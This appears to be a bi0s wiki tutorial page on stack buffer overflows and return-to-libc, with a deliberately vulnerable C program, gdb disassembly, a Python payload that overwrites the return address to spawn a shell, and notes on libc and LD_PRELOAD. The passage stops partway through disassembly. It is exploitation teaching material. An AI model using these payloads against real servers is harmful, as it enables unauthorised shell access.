@@ -1,0 +1,549 @@
+{% extends "bi0s_main.html" %}
+{% block title %}
+<title>ret2libc - bi0s wiki</title>
+{% endblock %}
+{% block content %}
+{% load static %}
+<div class="md-sidebar md-sidebar--secondary" data-md-component="toc" style="height: 527px;">
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav class="md-nav md-nav--secondary">
+<label class="md-nav__title" for="__toc">Table of contents</label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a href="#bring-on-the-shell" title="Bring on the shell!" class="md-nav__link">
+Bring on the shell!
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#a-bit-about-libc" title="A bit about libc" class="md-nav__link">
+A bit about libc
+</a>
+</li>
+<li class="md-nav__item">
+<a href="#return-to-libc_1" title="Return-to-libc" class="md-nav__link">
+Return-to-libc
+</a>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-content">
+<article class="md-content__inner md-typeset">
+<a href="https://gitlab.com/teambi0s/bi0s-wiki/blob/master/docs/pwning/return2libc/return-to-libc.md" title="Edit this page" class="md-icon md-content__icon"></a><img name="kl_1567871723423" style="width: 12px; height: 12px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsSAAALEgHS3X78AAAB3ElEQVQ4jY2TPWhTURTH/+e8l7QNJg0qCJpCSdEnONTFDk5udfILs9mS6iJYpI4VnURXUcRJrFG3gm3tXLpIxaUUIVA/iLRJayQ2Nk1q7cu99zjUF/JhQv7jOff/O+fcwyERAQAQEaoVjsdOirgP93L+W5svJpeq8xVfPWD/yPkepekBWbjETl8nM0h9XtkRV72xLbmdn5hJ/xdw4OaVkC6U7oBwg6MRH0d7fGTbQDoLIYKUXa2/rO5C6SdWOHh/4/HrLQCwvZZUoZi2Dh/ysdPbRZ0dNeOQCMj2WXTiaMCUtsdUKn0dQHcNAEZCVr+DViJjYAW6/NqI34txS0eVIqEwRgfONMTbApyORDE3PIbF9dX2AKPHTyESCFbMExeGMTL9EguZVHuAxY3vmBscwtkjfS3NTQELuQzi72bwaGAQ8elEUzNQtQUiLsmf3X3eCt/n1uBMPQUy2bqSDCIuNXQgjHnJ5kzTUt47rUQY8w0AG2ZcLX/bkc2t5m5mlJdTv22Y8QZAPjGbBPHl8oePRb2yruu9BjBu8msRGrF8YjZZGb3+mA5ePee4ip9xoKOfj/UGSRuYtR/b+ldxyW/paz+fv/0EtLhGT91DF2NgubtXnu4VXk1N1vzFP99f037PUFbu4yIAAAAASUVORK5CYII=" width="12" height="12">
+<h1 id="return-to-libc">Return to Libc<a class="headerlink" href="#return-to-libc" title="Permanent link">¶</a></h1>
+<h2 id="bring-on-the-shell">Bring on the shell!<a class="headerlink" href="#bring-on-the-shell" title="Permanent link">¶</a></h2>
+<p>Right, so you just redirected the control flow to execute the <code>win</code> function. Previously <code>win()</code> just printed out “Win” on to the screen. Now consider the same stack-example.c file, but this time we change the definition of <code>win</code>.</p>
+<div class="superfences-tabs">
+<input name="__tabs_1" type="radio" id="__tab_1_0" checked="checked">
+<label for="__tab_1_0">Source code</label>
+<div class="superfences-content"><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23</pre></div></td><td class="code"><div class="codehilite" id="__code_0"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_0 pre, #__code_0 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="cm">/* stack-example-shell.c */</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+
+<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
+  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">arr</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
+  <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span><span class="n">arr</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Input  : %s"</span><span class="p">,</span><span class="n">arr</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">vuln</span><span class="p">();</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</td></tr></tbody></table></div>
+</div>
+<p>Binary file: <a href="https://wiki.bi0s.in/pwning/return2libc/return-to-libc/stack-example-shell">stack-example-shell</a></p>
+<p>Before we even go into disassembling this, what do think the system 
+function does? It basically executes a shell command. The argument that 
+is passed to it is “/bin/sh”, so the whole statement <code>system(“/bin/sh”)</code> is basically equivalent to typing /bin/sh on the terminal. Let’s do exactly just that and type <code>/bin/sh</code> on the terminal. What did you get? This is a shell, similar to bash, but less advanced. Try typing commands like <code>pwd</code>, <code>ls</code>, <code>whoami</code> etc and observe the output. Thus we can see that <code>system(“/bin/sh”)</code> will land us a shell. </p>
+<p>Now let’s see the disassembly of vuln - </p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16</pre></div></td><td class="code"><div class="codehilite" id="__code_1"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_1 pre, #__code_1 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="w">       </span><span class="mh">0x0804846b</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="err">:</span><span class="w"> </span><span class="n">push</span><span class="w">   </span><span class="n">ebp</span><span class="w"></span>
+<span class="w">       </span><span class="mh">0x0804846c</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="err">:</span><span class="w"> </span><span class="n">mov</span><span class="w">    </span><span class="n">ebp</span><span class="p">,</span><span class="n">esp</span><span class="w"></span>
+<span class="w">       </span><span class="mh">0x0804846e</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="err">:</span><span class="w"> </span><span class="n">sub</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span><span class="w"></span>
+<span class="w">       </span><span class="mh">0x08048471</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;</span><span class="err">:</span><span class="w"> </span><span class="n">lea</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="o">[</span><span class="n">ebp-0x10</span><span class="o">]</span><span class="w"></span>
+<span class="w">       </span><span class="mh">0x08048474</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;</span><span class="err">:</span><span class="w"> </span><span class="n">push</span><span class="w">   </span><span class="n">eax</span><span class="w"></span>
+<span class="w">       </span><span class="mh">0x08048475</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">10</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="n">push</span><span class="w">   </span><span class="mh">0x8048530</span><span class="w"></span>
+<span class="w">       </span><span class="mh">0x0804847a</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="k">call</span><span class="w">   </span><span class="mh">0x8048350</span><span class="w"> </span><span class="o">&lt;</span><span class="n">__isoc99_scanf</span><span class="nv">@plt</span><span class="o">&gt;</span><span class="w"></span>
+<span class="w">       </span><span class="mh">0x0804847f</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">20</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="k">add</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0x8</span><span class="w"></span>
+<span class="w">       </span><span class="mh">0x08048482</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">23</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="n">lea</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="o">[</span><span class="n">ebp-0x10</span><span class="o">]</span><span class="w"></span>
+<span class="w">       </span><span class="mh">0x08048485</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">26</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="n">push</span><span class="w">   </span><span class="n">eax</span><span class="w"></span>
+<span class="w">       </span><span class="mh">0x08048486</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="n">push</span><span class="w">   </span><span class="mh">0x8048533</span><span class="w"></span>
+<span class="w">       </span><span class="mh">0x0804848b</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="k">call</span><span class="w">   </span><span class="mh">0x8048330</span><span class="w"> </span><span class="o">&lt;</span><span class="n">printf</span><span class="nv">@plt</span><span class="o">&gt;</span><span class="w"></span>
+<span class="w">       </span><span class="mh">0x08048490</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">37</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="k">add</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0x8</span><span class="w"></span>
+<span class="w">       </span><span class="mh">0x08048493</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="n">nop</span><span class="w"></span>
+<span class="w">       </span><span class="mh">0x08048494</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">41</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="n">leave</span><span class="w">  </span>
+<span class="w">       </span><span class="mh">0x08048495</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">42</span><span class="o">&gt;</span><span class="err">:</span><span class="w">    </span><span class="n">ret</span><span class="w"></span>
+</pre></div>
+</td></tr></tbody></table>
+<p>As you can see, this time we only have to give 0x10 bytes of junk 
+data and then 4 more bytes for ebp, to reach the saved eip. After that 
+we overwrite the saved eip with the address of <code>win</code>. Let’s find the address of <code>win</code> first - </p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5</pre></div></td><td class="code"><div class="codehilite" id="__code_2"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_2 pre, #__code_2 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="n">functions</span> <span class="n">win</span>
+<span class="k">All</span> <span class="n">functions</span> <span class="n">matching</span> <span class="n">regular</span> <span class="n">expression</span> <span class="ss">"win"</span><span class="p">:</span>
+
+<span class="n">Non</span><span class="o">-</span><span class="n">debugging</span> <span class="n">symbols</span><span class="p">:</span>
+<span class="mi">0</span><span class="n">x080484cb</span>  <span class="n">win</span>
+</pre></div>
+</td></tr></tbody></table>
+<p>Now let’s write the payload and send it.</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5
+6
+7
+8
+9</pre></div></td><td class="code"><div class="codehilite" id="__code_3"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_3 pre, #__code_3 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="o">!</span> <span class="n">python</span> <span class="o">-</span><span class="k">c</span> <span class="s1">'print "A"*0x14+"\xcb\x84\x04\x08"'</span> <span class="o">&gt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">inp</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">b</span><span class="o">*</span><span class="n">vuln</span><span class="o">+</span><span class="mi">42</span>
+<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="k">at</span> <span class="mi">0</span><span class="n">x804850c</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">inp</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="p">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">vignesh</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">stack</span><span class="o">-</span><span class="n">example</span><span class="o">-</span><span class="n">shell</span> <span class="o">&lt;</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">inp</span>
+
+<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="n">x0804850c</span> <span class="k">in</span> <span class="n">vuln</span> <span class="p">()</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">si</span>
+<span class="mi">0</span><span class="n">x080484cb</span> <span class="k">in</span> <span class="n">win</span> <span class="p">()</span>
+</pre></div>
+</td></tr></tbody></table>
+<p>Outside gdb, we can get a proper shell. <code>./stack-example-shell &lt; /tmp/inp</code>
+ will give the shell alright, but the issue will be that the shell will 
+close before you can givve any input. To keep the shell open you can do 
+this - </p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3</pre></div></td><td class="code"><div class="codehilite" id="__code_4"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_4 pre, #__code_4 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="p">(</span><span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">inp</span><span class="p">;</span><span class="n">cat</span><span class="p">)</span> <span class="o">|</span> <span class="p">.</span><span class="o">/</span><span class="n">stack</span><span class="o">-</span><span class="n">example</span><span class="o">-</span><span class="n">shell</span> 
+<span class="n">ls</span>
+<span class="n">stack</span><span class="o">-</span><span class="n">example</span><span class="o">-</span><span class="n">shell</span>  <span class="n">stack</span><span class="o">-</span><span class="n">example</span><span class="o">-</span><span class="n">shell</span><span class="p">.</span><span class="k">c</span>
+</pre></div>
+</td></tr></tbody></table>
+<p>The first <code>cat /tmp/inp</code> prints the payload and the second <code>cat</code> keeps the shell open. We redirect the input with a pipe in this case.</p>
+<p>So, how does getting the binary to spawn a shell progress us from 
+just a simple printf statement? Well, currently we ran the binary and 
+the exploit locally on our own system. Now imagine that the binary is 
+hosted on a server somewhere and you send the payload as an input. What 
+happens? Yes, you get a shell on the server! With the shell, you can do 
+almost anything on the server. Thus in most cases, our aim will be to 
+redirect control flow and get a shell.</p>
+<h2 id="a-bit-about-libc">A bit about libc<a class="headerlink" href="#a-bit-about-libc" title="Permanent link">¶</a></h2>
+<p>Everytime you write a C program, you are sure to use one or the other of the inbuilt functions, like <code>printf</code>, <code>scanf</code>, <code>puts</code>
+ etc. Have you wondered where the definitions of these functions lie? 
+All the standard C functions have been compiled into a single file, 
+named the standard C library or the <code>libc</code>. A libc is native to the system that you are working on and is independent of the binary (compiled program). You can use the <code>ldd</code> command to find out which libc is being used by an application.</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4</pre></div></td><td class="code"><div class="codehilite" id="__code_5"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_5 pre, #__code_5 code"><span class="md-clipboard__message"></span></button><pre><span></span>$ ldd ./ret2libc
+    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xf76df000<span class="o">)</span>
+    libc.so.6 <span class="o">=</span>&gt; /lib/i386-linux-gnu/libc.so.6 <span class="o">(</span>0xf74fd000<span class="o">)</span>
+    /lib/ld-linux.so.2 <span class="o">(</span>0xf76e0000<span class="o">)</span>
+</pre></div>
+</td></tr></tbody></table>
+<p>Thus <code>/lib/i386-linux-gnu/libc.so.6</code> is the libc that is 
+being used by the binary. The libc is ‘linked’ to the binary at 
+execution time. Thus, if you just load a binary into gdb and then try 
+doing <code>disas puts</code> you will not get the actual disassembly of the <code>puts</code>
+ function. This is because the program is not currently running and thus
+ the libc is not yet loaded. Whereas, once the program is running, you 
+can see the full disassembly of <code>puts</code> or any other libc function for that matter.</p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15</pre></div></td><td class="code"><div class="codehilite" id="__code_6"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_6 pre, #__code_6 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">disas</span> <span class="nv">puts</span>    ←<span class="o">-</span><span class="nv">No</span> <span class="nv">libc</span> <span class="nv">loaded</span> <span class="nv">thus</span> <span class="nv">puts</span> <span class="nv">will</span> <span class="nv">not</span> <span class="nv">exist</span> <span class="nv">right</span> <span class="nv">now</span>
+<span class="nv">No</span> <span class="nv">symbol</span> <span class="nv">table</span> <span class="nv">is</span> <span class="nv">loaded</span>.  <span class="nv">Use</span> <span class="nv">the</span> <span class="s2">"</span><span class="s">file</span><span class="s2">"</span> <span class="nv">command</span>.
+<span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">start</span>     ←<span class="o">-</span><span class="nv">Start</span> <span class="nv">executing</span> <span class="nv">the</span> <span class="nv">binary</span>. <span class="nv">Libc</span> <span class="nv">gets</span> <span class="nv">loaded</span> <span class="nv">now</span>
+<span class="nv">Temporary</span> <span class="nv">breakpoint</span> <span class="mi">1</span> <span class="nv">at</span> <span class="mi">0</span><span class="nv">x8048499</span>
+<span class="nv">Starting</span> <span class="nv">program</span>: <span class="o">/</span><span class="nv">home</span><span class="o">/</span><span class="nv">vignesh</span><span class="o">/</span><span class="nv">Documents</span><span class="o">/</span><span class="nv">a</span>.<span class="nv">out</span>
+
+<span class="nv">Temporary</span> <span class="nv">breakpoint</span> <span class="mi">1</span>, <span class="mi">0</span><span class="nv">x08048499</span> <span class="nv">in</span> <span class="nv">main</span> <span class="ss">()</span>
+<span class="ss">(</span><span class="nv">gdb</span><span class="ss">)</span> <span class="nv">disas</span> <span class="nv">puts</span>    ←<span class="o">-</span><span class="nv">Now</span> <span class="nv">libc</span> <span class="nv">is</span> <span class="nv">loaded</span> <span class="nv">and</span> <span class="nv">thus</span> <span class="nv">puts</span> <span class="nv">exists</span>
+<span class="nv">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="k">for</span> <span class="nv">function</span> <span class="nv">_IO_puts</span>:
+   <span class="mi">0</span><span class="nv">xf7e55ca0</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span>: <span class="nv">push</span>   <span class="nv">ebp</span>
+   <span class="mi">0</span><span class="nv">xf7e55ca1</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span>: <span class="nv">mov</span>    <span class="nv">ebp</span>,<span class="nv">esp</span>
+   <span class="mi">0</span><span class="nv">xf7e55ca3</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span>: <span class="nv">push</span>   <span class="nv">edi</span>
+   <span class="mi">0</span><span class="nv">xf7e55ca4</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span>: <span class="nv">push</span>   <span class="nv">esi</span>
+   <span class="mi">0</span><span class="nv">xf7e55ca5</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;</span>: <span class="nv">push</span>   <span class="nv">ebx</span>
+   ....
+</pre></div>
+</td></tr></tbody></table>
+<p>Understanding the libc is pretty important from an exploitation point
+ of view as we can redirect the control flow to libc functions as we 
+will see in the following section. Since a libc file is native to a 
+system, each of us can have a different libc file. Thus for 
+comprehensibility between the libc addresses used in this wiki and those
+ while you try out the challenges yourself, we will provide the libc 
+file along with the binary. To run programs with a libc file other than 
+your host libc, you can used the <code>LD_PRELOAD</code> environment variable. For example, if you want to use a libc - libc.so - instead of your original one, you can set <code>LD_PRELOAD</code> to path of the libc function </p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3</pre></div></td><td class="code"><div class="codehilite" id="__code_7"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_7 pre, #__code_7 code"><span class="md-clipboard__message"></span></button><pre><span></span>$ ls
+a.out  libc.so
+$ <span class="nb">export</span> <span class="nv">LD_PRELOAD</span><span class="o">=</span>./libc.so
+</pre></div>
+</td></tr></tbody></table>
+<p>Within gdb, you can set <code>LD_PRELOAD</code> like this - </p>
+<blockquote>
+<p>(gdb) set environment LD_PRELOAD=./libc.so</p>
+</blockquote>
+<h2 id="return-to-libc_1">Return-to-libc<a class="headerlink" href="#return-to-libc_1" title="Permanent link">¶</a></h2>
+<p>So now you know what a buffer overflow vulnerability is and also how 
+to use it to control the flow to the application and execute an address 
+of our choice. In the previous section, we directed the control flow to 
+execute a function called win. With the help of this function we spawned
+ a shell. But you might be wondering, surely no real world programs 
+would contain such helpful functions like our ‘win’? Well, you are right
+ there. But what most of the applications do have access to would is the
+ standard C shared library or ‘libc’. </p>
+<p>The libc contains all the standard functions that can be used by any C
+ program. The ‘win’ function previously used, actually called the C 
+function, ‘system’, which executes a shell command. The <code>system</code>
+ function, as already mentioned, is a standard C function, which means 
+that it will surely exist in the libc. If you check out the man page of 
+‘system’, then you will notice that the argument is actually a pointer 
+to the command to be executed. The string “/bin/sh” will also be present
+ in the libc, and thus getting a pointer is just to note the address of 
+this string.</p>
+<p>So before proceeding further, let’s get our aim clear. We want to 
+exploit a simple buffer overflow bug, the same as the previous section, 
+but this time there will be no ‘win’ type functions to make life easy 
+for us. For our example, the aim will be to get our vulnerable 
+application to spawn a shell. Thus we need to overwrite the return 
+address with the address of ‘system’ function and provide the argument 
+as a pointer to “/bin/sh”</p>
+<p>Ok, three paras of theory is more than enough! Let’s get our hands 
+dirty now. We’ll use the same code as in the previous section, but 
+without the <code>win</code> function. </p>
+<div class="superfences-tabs">
+<input name="__tabs_2" type="radio" id="__tab_2_0" checked="checked">
+<label for="__tab_2_0">Source code</label>
+<div class="superfences-content"><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16</pre></div></td><td class="code"><div class="codehilite" id="__code_8"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_8 pre, #__code_8 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="cm">/* ret2libc.c */</span>
+
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+
+<span class="kt">void</span> <span class="nf">vuln</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">arr</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
+  <span class="n">scanf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span><span class="n">arr</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">"Input  : %s"</span><span class="p">,</span><span class="n">arr</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">vuln</span><span class="p">();</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</td></tr></tbody></table></div>
+</div>
+<p>Binary file: <a href="https://gitlab.com/teambi0s/bi0s-wiki/raw/master/Pwning/return2libc/ret2libc">ret2libc</a><img name="kl_1567871723423" style="width: 12px; height: 12px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsSAAALEgHS3X78AAAB3ElEQVQ4jY2TPWhTURTH/+e8l7QNJg0qCJpCSdEnONTFDk5udfILs9mS6iJYpI4VnURXUcRJrFG3gm3tXLpIxaUUIVA/iLRJayQ2Nk1q7cu99zjUF/JhQv7jOff/O+fcwyERAQAQEaoVjsdOirgP93L+W5svJpeq8xVfPWD/yPkepekBWbjETl8nM0h9XtkRV72xLbmdn5hJ/xdw4OaVkC6U7oBwg6MRH0d7fGTbQDoLIYKUXa2/rO5C6SdWOHh/4/HrLQCwvZZUoZi2Dh/ysdPbRZ0dNeOQCMj2WXTiaMCUtsdUKn0dQHcNAEZCVr+DViJjYAW6/NqI34txS0eVIqEwRgfONMTbApyORDE3PIbF9dX2AKPHTyESCFbMExeGMTL9EguZVHuAxY3vmBscwtkjfS3NTQELuQzi72bwaGAQ8elEUzNQtQUiLsmf3X3eCt/n1uBMPQUy2bqSDCIuNXQgjHnJ5kzTUt47rUQY8w0AG2ZcLX/bkc2t5m5mlJdTv22Y8QZAPjGbBPHl8oePRb2yruu9BjBu8msRGrF8YjZZGb3+mA5ePee4ip9xoKOfj/UGSRuYtR/b+ldxyW/paz+fv/0EtLhGT91DF2NgubtXnu4VXk1N1vzFP99f037PUFbu4yIAAAAASUVORK5CYII=" width="12" height="12"></p>
+<p>libc: <a href="https://gitlab.com/teambi0s/bi0s-wiki/raw/master/Pwning/return2libc/libc.so.6">libc.so.6</a><img name="kl_1567871723423" style="width: 12px; height: 12px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsSAAALEgHS3X78AAAB3ElEQVQ4jY2TPWhTURTH/+e8l7QNJg0qCJpCSdEnONTFDk5udfILs9mS6iJYpI4VnURXUcRJrFG3gm3tXLpIxaUUIVA/iLRJayQ2Nk1q7cu99zjUF/JhQv7jOff/O+fcwyERAQAQEaoVjsdOirgP93L+W5svJpeq8xVfPWD/yPkepekBWbjETl8nM0h9XtkRV72xLbmdn5hJ/xdw4OaVkC6U7oBwg6MRH0d7fGTbQDoLIYKUXa2/rO5C6SdWOHh/4/HrLQCwvZZUoZi2Dh/ysdPbRZ0dNeOQCMj2WXTiaMCUtsdUKn0dQHcNAEZCVr+DViJjYAW6/NqI34txS0eVIqEwRgfONMTbApyORDE3PIbF9dX2AKPHTyESCFbMExeGMTL9EguZVHuAxY3vmBscwtkjfS3NTQELuQzi72bwaGAQ8elEUzNQtQUiLsmf3X3eCt/n1uBMPQUy2bqSDCIuNXQgjHnJ5kzTUt47rUQY8w0AG2ZcLX/bkc2t5m5mlJdTv22Y8QZAPjGbBPHl8oePRb2yruu9BjBu8msRGrF8YjZZGb3+mA5ePee4ip9xoKOfj/UGSRuYtR/b+ldxyW/paz+fv/0EtLhGT91DF2NgubtXnu4VXk1N1vzFP99f037PUFbu4yIAAAAASUVORK5CYII=" width="12" height="12"></p>
+<p>First let’s take a look a the disassembly of main - </p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre>1
+2
+3
+4
+5
+6</pre></div></td><td class="code"><div class="codehilite" id="__code_9"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_9 pre, #__code_9 code"><span class="md-clipboard__message"></span></button><pre><span></span>   <span class="mi">0</span><span class="n">x08048496</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">push</span>   <span class="n">ebp</span>
+   <span class="mi">0</span><span class="n">x08048497</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+   <span class="mi">0</span><span class="n">x08048499</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span> <span class="k">call</span>   <span class="mi">0</span><span class="n">x804846b</span> <span class="o">&lt;</span><span class="n">vuln</span><span class="o">&gt;</span>
+   <span class="mi">0</span><span class="n">x0804849e</span> <span class="o">&lt;+</span><span class="mi">8</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mi">0</span><span class="n">x0</span>
+   <span class="mi">0</span><span class="n">x080484a3</span> <span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">ebp</span>
+   <span class="mi">0</span><span class="n">x080484a4</span> <span class="o">&lt;+</span><span class="mi">14</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">ret</span>
+</pre></div>
+</td></tr></tbody></table>
+<p>Now here’s the disassembly of vuln - </p>
+<table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16</pre></div></td><td class="code"><div class="codehilite" id="__code_10"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_10 pre, #__code_10 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="w">   </span><span class="mh">0x0804846b</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="err">:</span><span class="w"> </span><span class="n">push</span><span class="w">   </span><span class="n">ebp</span><span class="w"></span>
